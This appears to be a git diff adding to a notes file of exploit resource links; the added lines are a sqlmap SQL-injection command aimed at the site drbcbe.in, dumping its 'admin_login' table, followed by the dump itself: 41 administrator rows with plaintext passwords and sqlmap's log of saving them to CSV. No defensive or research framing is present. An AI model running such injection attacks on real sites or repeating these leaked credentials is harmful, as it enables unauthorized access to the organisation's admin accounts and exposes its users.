@@ -3,6 +3,59 @@ https://github.com/savior-only/Spring_All_Reachable
 https://a0.fit/post/0day/
 https://gobysec.net/updates
 
+sqlmap.py -r drbcbe.in.dic --random-agent --risk 3 --batch -D DRB -T admin_login --dump
 
+
+Database: DRB
+Table: admin_login
+[41 entries]
++-----+--------+--------+--------+----------+---------------------+-----------+-----------------+---------------------+
+| id  | D_CODE | name   | role   | username | lastlogin           | resetpass | password        | lastlogout          |
++-----+--------+--------+--------+----------+---------------------+-----------+-----------------+---------------------+
+| 123 | 75     | admin  | admin  | admin    | 2022-12-09 09:42:24 | Y         | test@123        | 2022-10-11 16:55:17 |
+| 129 | 01     | admin  | admin  | admin    | 2022-12-29 04:52:58 | N         | Drb@2023        | NULL                |
+| 130 | 02     | admin  | admin  | admin    | 2023-09-13 08:05:44 | N         | 7ZzNhu          | NULL                |
+| 131 | 03     | admin  | admin  | admin    | 2023-08-13 11:04:30 | N         | cudjrvn22       | NULL                |
+| 132 | 04     | admin  | admin  | admin    | 2022-12-29 13:21:28 | N         | JRCOOP1234      | NULL                |
+| 133 | 05     | admin  | admin  | admin    | 2023-09-13 11:02:45 | N         | DrbDgl@12345    | NULL                |
+| 134 | 88     | admin  | admin  | admin    | 2023-06-25 17:36:53 | N         | Shoebag$1942    | NULL                |
+| 135 | 07     | admin  | admin  | admin    | 2023-08-10 06:47:18 | N         | kpmdrb2022#     | NULL                |
+| 136 | 08     | admin  | admin  | admin    | 2023-08-13 11:21:55 | N         | Drb2022         | NULL                |
+| 137 | 09     | admin  | admin  | admin    | 2023-09-09 08:20:26 | N         | tiger@1980      | NULL                |
+| 138 | 10     | admin  | admin  | admin    | 2022-12-16 15:17:44 | N         | Drbkkri_2022    | NULL                |
+| 139 | 11     | admin  | admin  | admin    | 2023-09-11 12:12:15 | N         | JRmdu@2022      | NULL                |
+| 140 | 12     | admin  | admin  | admin    | 2023-07-19 06:22:51 | N         | Nagapattinam    | NULL                |
+| 141 | 13     | admin  | admin  | admin    | 2023-08-31 13:00:04 | N         | Nmkdrb2022      | NULL                |
+| 142 | 14     | admin  | admin  | admin    | 2023-08-30 12:55:10 | N         | drb142022       | NULL                |
+| 143 | 15     | admin  | admin  | admin    | 2023-09-13 10:15:28 | N         | pblr@123        | NULL                |
+| 144 | 16     | admin  | admin  | admin    | 2023-02-10 10:50:21 | N         | drb2222         | NULL                |
+| 145 | 17     | admin  | admin  | admin    | 2023-09-07 10:33:44 | N         | JSnHO4          | NULL                |
+| 146 | 18     | admin  | admin  | admin    | 2023-08-17 10:59:00 | N         | WINwin33        | NULL                |
+| 147 | 19     | admin  | admin  | admin    | 2023-08-29 09:41:42 | N         | Drbsvg2022      | NULL                |
+| 148 | 20     | admin  | admin  | admin    | 2023-09-13 12:47:44 | N         | Jrtnj@123       | NULL                |
+| 149 | 21     | admin  | admin  | admin    | 2023-07-04 12:18:19 | N         | SPrit2022@      | NULL                |
+| 150 | 22     | admin  | admin  | admin    | 2023-08-14 08:09:06 | N         | Drbtut@22       | NULL                |
+| 151 | 23     | admin  | admin  | admin    | 2023-08-14 06:37:22 | N         | admin           | NULL                |
+| 152 | 24     | admin  | admin  | admin    | 2023-09-12 10:34:06 | N         | drb@2022        | NULL                |
+| 153 | 25     | admin  | admin  | admin    | 2023-09-11 05:04:17 | N         | drpdscoe@2022   | NULL                |
+| 154 | 26     | admin  | admin  | admin    | 2023-08-01 15:09:51 | N         | drb@123         | NULL                |
+| 155 | 27     | admin  | admin  | admin    | 2022-12-31 02:49:52 | N         | hypothetical@12 | NULL                |
+| 156 | 28     | admin  | admin  | admin    | 2023-07-28 10:50:35 | N         | Drbtvr@2022     | NULL                |
+| 157 | 29     | admin  | admin  | admin    | 2023-08-18 05:48:11 | N         | JRvlr@drb2022   | NULL                |
+| 158 | 30     | admin  | admin  | admin    | 2023-06-17 08:38:05 | N         | JRvpm700        | NULL                |
+| 159 | 31     | admin  | admin  | admin    | 2023-09-13 11:22:03 | N         | vnrdrb@123      | NULL                |
+| 160 | 32     | admin  | admin  | admin    | 2023-01-31 05:06:13 | N         | 2710MSK         | NULL                |
+| 161 | 33     | admin  | admin  | admin    | NULL                | N         | yW0wJ1          | NULL                |
+| 162 | 34     | admin  | admin  | admin    | 2023-09-08 08:01:17 | N         | Okw9i7          | NULL                |
+| 163 | 35     | admin  | admin  | admin    | 2023-09-05 10:25:37 | N         | Tamil@10        | NULL                |
+| 164 | 36     | admin  | admin  | admin    | 2023-09-09 11:27:55 | N         | Spmtpt@2022     | NULL                |
+| 165 | 37     | admin  | admin  | admin    | 2023-07-14 05:44:14 | N         | jrkki@22        | NULL                |
+| 166 | 38     | admin  | admin  | admin    | 2023-07-20 16:40:52 | N         | myddrb2022      | NULL                |
+| 167 | 39     | admin  | admin  | admin    | 2022-12-26 05:10:01 | N         | drbrecjr@2022   | NULL                |
+| 168 | 06     | admin  | admin  | admin    | 2023-09-12 23:30:14 | N         | JRCS@123        | NULL                |
++-----+--------+--------+--------+----------+---------------------+-----------+-----------------+---------------------+
+
+[01:46:28] [INFO] table 'DRB.admin_login' dumped to CSV file '/var/root/.local/share/sqlmap/output/drbcbe.in/dump/DRB/admin_login.csv'
+[01:46:28] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/drbcbe.in'
 
 
